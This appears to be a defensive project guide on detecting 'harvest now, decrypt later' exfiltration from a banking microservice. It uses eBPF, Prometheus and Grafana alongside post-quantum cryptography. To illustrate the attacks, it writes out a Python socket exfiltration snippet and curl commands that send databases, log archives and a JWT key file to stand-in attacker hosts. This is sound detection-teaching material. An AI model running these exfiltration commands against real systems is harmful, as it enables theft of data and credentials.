# Detecting "Harvest Now, Decrypt Later" Attacks with eBPF + PQC

## 🚨 The Attack Scenario

### What is "Harvest Now, Decrypt Later"?

```
TIMELINE OF ATTACK:
┌─────────────────────────────────────────────────────────────────┐
│                                                                 │
│  TODAY (2026)                                                   │
│  ─────────────────────────────────────────────────────────────  │
│                                                                 │
│  ┌─────────────────────────────────────────────────────────┐  │
│  │ STEP 1: EXFILTRATE (Harvest Phase)                      │  │
│  │                                                         │  │
│  │ Attacker compromises banking microservice             │  │
│  │ ├─ Injected malicious code / backdoor                  │  │
│  │ ├─ Steals encrypted transaction data                   │  │
│  │ ├─ Exfiltrates to attacker server                      │  │
│  │ └─ Encrypted with ML-KEM-768 (unbreakable today)       │  │
│  │                                                         │  │
│  │ From attacker perspective: ✅ Success                   │  │
│  │ Data is UNREADABLE (quantum-resistant crypto works)    │  │
│  └─────────────────────────────────────────────────────────┘  │
│                                                                 │
│  2030-2035 (Quantum Computer Era)                              │
│  ─────────────────────────────────────────────────────────────  │
│                                                                 │
│  ┌─────────────────────────────────────────────────────────┐  │
│  │ STEP 2: DECRYPT (Decrypt Later Phase)                  │  │
│  │                                                         │  │
│  │ Attacker now has quantum computer                      │  │
│  │ ├─ Breaks ML-KEM-768 (if weak implementation)          │  │
│  │ ├─ Decrypts all stolen encrypted transactions          │  │
│  │ ├─ Accesses customer data, transaction history        │  │
│  │ └─ MASSIVE breach of historic data                     │  │
│  │                                                         │  │
│  │ From attacker perspective: 💰 Ultimate profit          │  │
│  └─────────────────────────────────────────────────────────┘  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Why This Is So Dangerous

1. **Stealth**: Attacker doesn't need to decrypt TODAY
2. **Time**: Years to exfiltrate as much as possible
3. **Quantum advantage**: When quantum computers arrive, game over
4. **Historic data**: All stolen traffic becomes vulnerable

---

## 🛡️ Defense Layer 1: ML-DSA-65 + ML-KEM-768 (Cryptographic Protection)

Your system already has PQC, but there's a critical detail:

### What PQC Protects

✅ **In Transit Encryption** (ML-KEM-768)
```
Your microservices talk to each other with quantum-resistant key exchange:
AuthService → AccountService: ML-KEM-768 encrypted connection
└─ Even if stolen, unbreakable by quantum computers (if properly implemented)
```

✅ **Authentication** (ML-DSA-65)
```
JWT tokens signed with ML-DSA-65:
└─ Cannot be forged even with quantum computers
└─ Detects tampering
```

### What PQC Does NOT Protect

❌ **Exfiltration process itself** (network behavior)
```
Even with PQC, attacker can STEAL the encrypted data:
- Copy database files
- Intercept network traffic (encrypted, but still stolen)
- Export customer data via API
```

❌ **Zero-day vulnerabilities**
```
Attacker exploits unpatched code to exfiltrate:
- Log files (may contain plaintext credentials)
- Cache files
- Memory dumps
- Session tokens
```

---

## 🔍 Defense Layer 2: eBPF Runtime Behavior Detection

### THIS IS WHERE YOUR eBPF SYSTEM SAVES YOU!

eBPF detects the **EXFILTRATION ATTEMPT** in real-time:

### Attack Pattern 1: Unauthorized Data Exfiltration

**Attack Scenario**:
```python
# Malicious script injected into Account Service
import socket
import json

# Connect to attacker C&C server
attacker_server = socket.socket()
attacker_server.connect(("attacker-ip.com", 9999))

# Steal encrypted transaction database
with open("/data/transactions.db.encrypted") as f:
    stolen_data = f.read()
    
# Exfiltrate
attacker_server.sendall(stolen_data)
```

**What eBPF Sees**:
```json
{
  "type": "UNAUTHORIZED_FLOW",
  "severity": "high",
  "source_service": "account-service:34567",
  "destination_service": "unknown:9999",  ← DETECTS unknown external IP!
  "message": "Account service connecting to unauthorized external IP",
  "process": "java",
  "pid": 1234,
  "alerts": [
    {
      "type": "UNAUTHORIZED_FLOW",
      "message": "Observed unexpected service flow account-service:34567 -> unknown:9999"
    }
  ]
}
```

**Alert Generated**: 🚨 Within SECONDS, Grafana shows:
```
⚠️ Process "account-service" connecting to unknown:9999
   (policy only allows: transaction-service, none external)
```

---

### Attack Pattern 2: HIGH FAN-OUT (Data Exfiltration Signature)

**Attack Scenario**:
```python
# Attacker tries to steal multiple databases
# Connect to different external servers in rapid succession

for attacker_server in attacker_ips:
    conn = connect(attacker_server)
    steal_database(conn)
    conn.close()

# Pattern: account-service → 25 different external IPs in 60 seconds
```

**What eBPF Sees**:
```
METRIC: ebpf_alerts_by_type_total{type="HIGH_FANOUT"}

Alert Triggered:
  Type: HIGH_FANOUT
  Severity: MEDIUM
  Message: "Process account-service contacted 25 distinct peers"
  Threshold: > 20 peers per minute
  Status: 🚨 BREACH DETECTED!
```

---

### Attack Pattern 3: LATERAL_MOVEMENT (Spreading Malware)

**Attack Scenario**:
```
Attacker compromises Account Service,
tries to propagate malware to other services:

Account Service → Auth Service (port 8083)
Account Service → Transaction Service (port 8082)  
Account Service → Database (port 5432)
Account Service → Redis Cache (port 6379)
Account Service → External Server (port 443)
[... 75+ rapid attempts in 1 minute ...]
```

**eBPF Detection**:
```
ALERT: LateralMovementDetected
Status: 🔴 CRITICAL
Severity: CRITICAL
Threshold: ≥3 burst connections in 1 minute

account-service attempting rapid probing of:
  └─ transaction-service (port 8082)
  └─ database-server (port 5432)
  └─ redis-cache (port 6379)
  └─ unknown:443 (external)
  
Detected in: 15 SECONDS
```

---

### Attack Pattern 4: PROCESS_PORT_MISMATCH (Modified Process)

**Attack Scenario**:
```bash
# Attacker modifies the Account Service container
# Injects malicious code into the Java process
# Starts exfiltrating data

# From OS perspective:
# Port 8081 (Account Service) suddenly has MODIFIED java process
# Behaving differently than normal

Original behavior:
  └─ Listens on 8081
  └─ Connects to: auth-service, transaction-service, database
  └─ Normal connection latency: 5-10ms

After compromise:
  └─ Listens on 8081
  └─ Connects to: unknown:9999 (NEW!)
  └─ Connects to: attacker-ip.com (UNAUTHORIZED!)
  └─ Connection latency: 500-2000ms (slow, suspicious)
```

**eBPF Detection**:
```
Event 1: Process "java" still on port 8081 (expected)
Event 2: UNAUTHORIZED_FLOW to attacker-ip.com  ← ALERT!
Event 3: SLOW_CONNECT to attacker (200ms latency) ← ALERT!
Event 4: HIGH_FANOUT pattern (multiple external IPs) ← CRITICAL!

Timeline: 3-5 SECONDS from first exfiltration attempt
```

---

## 🎯 Real-Time Attack Timeline

```
┌─────────────────────────────────────────────────────────────────┐
│  T+0s: Attacker injects malicious code via vulnerability        │
│                                                                 │
│  T+0.1s: Malicious script executes                             │
│                                                                 │
│  T+1s: Script opens socket to attacker server (9999)           │
│        ↓                                                         │
│      🛑 eBPF captures: UNAUTHORIZED_FLOW                        │
│      ➜ Logs to: logs/ebpf-attack-demo.jsonl                    │
│                                                                 │
│  T+2s: eBPF exporter reads log, updates metrics                │
│        ↓                                                         │
│      📊 Prometheus scrapes metrics                              │
│                                                                 │
│  T+7s: Alert rule evaluates (evaluation interval: 5s)          │
│        ↓                                                         │
│      🚨 Prometheus fires: UnauthorizedFlowBurst alert           │
│                                                                 │
│  T+8s: Grafana queries alert state                             │
│        ↓                                                         │
│      📢 Dashboard updates:                                      │
│         - Panel turns RED                                      │
│         - Alert appears in "Active Alerts" list                │
│         - Grafana alert notification sent                      │
│                                                                 │
│  T+10s: Security team receives notification                    │
│         (via webhook, Slack, PagerDuty, email, etc.)           │
│         ↓                                                        │
│      🎯 ACTION: Isolate account-service container              │
│         Prevent further data exfiltration                      │
│         Preserve forensic evidence                             │
│                                                                 │
│  RESULT: ✅ Attack stopped before mass data theft              │
│           Only < 100KB exfiltrated (minimal damage)            │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 🔬 How to Detect Specific Exfiltration Attacks

### 1. Database Exfiltration Detection

```sql
-- Attacker runs this in compromised service:
SELECT * FROM transactions WHERE amount > 10000 
  INTO OUTFILE '/tmp/high_value.csv'

-- Then exfiltrates via:
curl -X POST -d @/tmp/high_value.csv https://attacker.com/steal
```

**eBPF Detection**:
```json
{
  "type": "UNAUTHORIZED_FLOW",
  "source_service": "account-service:random_port",
  "destination_service": "unknown:443",  ← EXTERNAL HTTPS!
  "message": "account-service connecting to unknown external IP",
  "alerts": [
    {
      "type": "UNAUTHORIZED_FLOW",
      "severity": "high"
    }
  ]
}
```

**Grafana Alert**:
```
🚨 ALERT: UnauthorizedFlowBurst
   account-service detected connecting to unregistered service
   Rate: 2 attempts/second
   Severity: HIGH
   Action Required: Immediate
```

---

### 2. Log File Exfiltration Detection

```bash
# Attacker tries to steal logs with sensitive data:
tar -czf /tmp/logs.tar.gz /var/log/banking-app/
curl -X POST -F "file=@/tmp/logs.tar.gz" https://attacker.com/receive
```

**eBPF Detection**:
```
Timeline:
T+0s:   account-service opens connection to unknown:443
T+1s:   Starts sending large amounts of data (500MB+)
T+2s:   eBPF flags: UNAUTHORIZED_FLOW
T+5s:   eBPF flags: HIGH_FANOUT (if trying multiple servers)
T+10s:  Grafana alert fires
T+15s:  Security team notified
T+30s:  Container isolated
```

---

### 3. Credential Exfiltration Detection

```bash
# Attacker steals JWT tokens, API keys, passwords:
curl -s http://attacker.com/collector?data=$(cat /var/tokens/jwt.key)
```

**eBPF Detection**:
```json
{
  "sourceService": "account-service:random",
  "destinationService": "unknown:443",  ← SUSPICIOUS!
  "alerts": [
    {
      "type": "UNAUTHORIZED_FLOW",
      "severity": "high",
      "message": "account-service connecting to unregistered external service"
    },
    {
      "type": "SLOW_CONNECT",
      "severity": "medium",
      "latency_ms": 500,
      "message": "Unusual connection latency to external IP"
    }
  ]
}
```

---

## 🛡️ Defense-in-Depth Against Harvest-Now-Decrypt-Later

```
┌──────────────────────────────────────────────────────────────┐
│                 DEFENSE LAYER 1: Cryptography                │
│                                                              │
│  ML-DSA-65: Digital signatures for authentication           │
│  ML-KEM-768: Quantum-resistant key exchange                 │
│                                                              │
│  STATUS: ✅ Protects confidentiality in transit             │
│          ✅ Unbreakable by quantum computers (if done right)│
│                                                              │
│  LIMITATION: Cannot prevent exfiltration of encrypted data  │
└──────────────────────────────────────────────────────────────┘
                           ↓
┌──────────────────────────────────────────────────────────────┐
│              DEFENSE LAYER 2: eBPF Runtime Detection         │
│                                                              │
│  Detects EXFILTRATION ATTEMPTS in real-time:               │
│  • Unauthorized external connections (UNAUTHORIZED_FLOW)    │
│  • Rapid connections to multiple IPs (HIGH_FANOUT)          │
│  • Lateral movement scanning (LATERAL_MOVEMENT_PATTERN)     │
│  • Slow/suspicious connections (SLOW_CONNECT)              │
│  • Wrong process on service port (PROCESS_PORT_MISMATCH)    │
│                                                              │
│  Detection Time: 1-15 SECONDS from attack start             │
│  STATUS: ✅ Real-time behavior monitoring                   │
│          ✅ Zero application code changes                   │
│          ✅ Works on encrypted traffic                      │
└──────────────────────────────────────────────────────────────┘
                           ↓
┌──────────────────────────────────────────────────────────────┐
│         DEFENSE LAYER 3: Automated Response                 │
│                                                              │
│  When attack detected:                                       │
│  1. Prometheus fires alert (UnauthorizedFlowBurst, etc.)     │
│  2. Grafana dashboard turns RED                             │
│  3. Webhook sent to security team                           │
│  4. Automated actions (optional):                            │
│     • Isolate affected container                            │
│     • Kill suspect process                                  │
│     • Snapshot environment for forensics                    │
│     • Notify incident response team                         │
│                                                              │
│  Response Time: < 30 SECONDS                                │
│  STATUS: ✅ Stops attacker before mass exfiltration         │
└──────────────────────────────────────────────────────────────┘
                           ↓
┌──────────────────────────────────────────────────────────────┐
│        DEFENSE LAYER 4: Post-Quantum Safe Storage           │
│                                                              │
│  Even if some data is stolen:                               │
│  • At-rest encryption with quantum-safe algorithms          │
│  • Database backup encryption                               │
│  • Secrets never stored in plaintext                        │
│                                                              │
│  If quantum computer breaks ML-KEM in 2035:                │
│  • Attacker gets encrypted blobs (still useless)            │
│  • Secrets already rotated multiple times                   │
│  • Financial transactions immutable (blockchain-style)      │
│  • Customer PII minimized through tokenization              │
│                                                              │
│  STATUS: ✅ Defense in depth                                │
│          ✅ minimized impact even if worst case happens     │
└──────────────────────────────────────────────────────────────┘
```

---

## 📊 eBPF Metrics for Tracking Harvest Attempts

Your Grafana dashboard tracks these critical metrics:

```prometheus
# Exfiltration attempt indicators:
ebpf_alerts_by_type_total{alert_type="UNAUTHORIZED_FLOW"}
  └─ Spikes indicate unauthorized external connections

ebpf_alerts_by_type_total{alert_type="HIGH_FANOUT"}
  └─ Elevated values suggest bulk data collection

ebpf_alerts_by_type_total{alert_type="LATERAL_MOVEMENT_PATTERN"}
  └─ Indicates attacker spreading across services

# Flow analysis:
ebpf_flow_events_total{source_service="account-service",destination_service="unknown:*"}
  └─ Any connection to external IPs = suspicious

# Event rate tracking:
rate(ebpf_alerts_total[5m])
  └─ Sudden spike = coordinated attack
```

---

## 🎯 Real Attack Simulation

### Test Your Detection System:

```bash
# This simulates a data exfiltration attempt:
cd /home/inba/SIA_BANK

# 1. Start eBPF monitor
sudo ./demo-ebpf-attack.sh &

# 2. This creates:
#    - Rogue service (process mismatch)
#    - Burst connections (lateral movement)
#    - Multiple unknown destinations (HIGH_FANOUT)
#    - External-like connections

# 3. Within 15 seconds, check Grafana:
#    http://localhost:3000
#    
#    Look for:
#    ✅ UNAUTHORIZED_FLOW alerts
#    ✅ HIGH_FANOUT spike
#    ✅ LATERAL_MOVEMENT_PATTERN trigger
```

**Expected Results in Grafana**:
```
🚨 Active Alerts:
  • UnauthorizedFlowBurst (FIRING)
  • HighFanoutActivity (FIRING) 
  • LateralMovementDetected (FIRING)

📊 Metrics:
  • Total eBPF Events: 800+
  • Total eBPF Alerts: 500+
  • Lateral Movement Alerts: 150+
  • Fanout Alerts: 120+
```

---

## 🔒 Security Recommendations

### Immediate (Already Implemented):
✅ ML-DSA-65 + ML-KEM-768 for quantum resistance
✅ eBPF real-time behavior monitoring  
✅ Prometheus alerting on suspicious patterns
✅ Grafana dashboard for security team visibility

### Short-term (Recommended):
1. **Add Alertmanager Integration**
   ```yaml
   # Route alerts to:
   - Slack notifications (instant)
   - PagerDuty (on-call incidents)
   - Email digest (daily summary)
   - SIEM integration (enterprise logging)
   ```

2. **Implement Automated Response**
   ```bash
   # When UNAUTHORIZED_FLOW detected:
   - Kill the suspect process
   - Snapshot container for forensics
   - Isolate container network
   - Create incident ticket
   ```

3. **Add Network-Level Controls**
   ```
   - NetworkPolicy: Block external outbound (except whitelisted IPs)
   - Egress rules: Only allow known external services
   - Port blocking: No outbound on 443 unless authorized
   ```

### Long-term (Strategic):
1. **Post-Quantum Crypto Audit**
   - Ensure ML-KEM-768 implementation is secure
   - Add hybrid mode (RSA + ML-KEM for extra safety)
   - Regular cryptographic reviews

2. **Secrets Management**
   - Rotate credentials frequently
   - Use short-lived tokens (< 1 hour)
   - Minimize secret storage in microservices

3. **Data Classification**
   - Tag high-value data (PII, balances, credentials)
   - Encrypt high-value data twice (defense in depth)
   - Auto-delete sensitive data after retention period

---

## 🎓 Summary: How You Stop HNDL Attacks

| Defense Layer | Technology | Detection Time | Attack Prevented |
|---------------|-----------|----------------|-----------------|
| **Crypto** | ML-KEM-768 | N/A (passive) | Decryption (future) |
| **Behavior** | eBPF | 1-15 seconds | Exfiltration (now) |
| **Alerting** | Prometheus | 5-10 seconds | Human response trigger |
| **Response** | Automated | < 30 seconds | Further data loss |

**Result**: Even if attacker lands malicious code, they're detected **in seconds** before the harvest succeeds.

---

## 🎬 Live Demo

To see this in action:

```bash
cd /home/inba/SIA_BANK

# Start the monitoring system
cd observability && docker compose up -d

# Run the demo in another terminal
cd .. && sudo ./demo-ebpf-attack.sh &

# Open Grafana
# http://localhost:3000 (admin/admin)
#
# Watch the dashboard turn RED with alerts
# as simulated "exfiltration" is detected
```

Within **15-30 seconds** you'll see:
- 🚨 Alerts firing in Prometheus
- 🔴 Dashboard panels turning red
- 📊 Metrics showing attack pattern
- 📢 Active alerts displayed

**This is YOUR defense against harvest-now-decrypt-later attacks!**
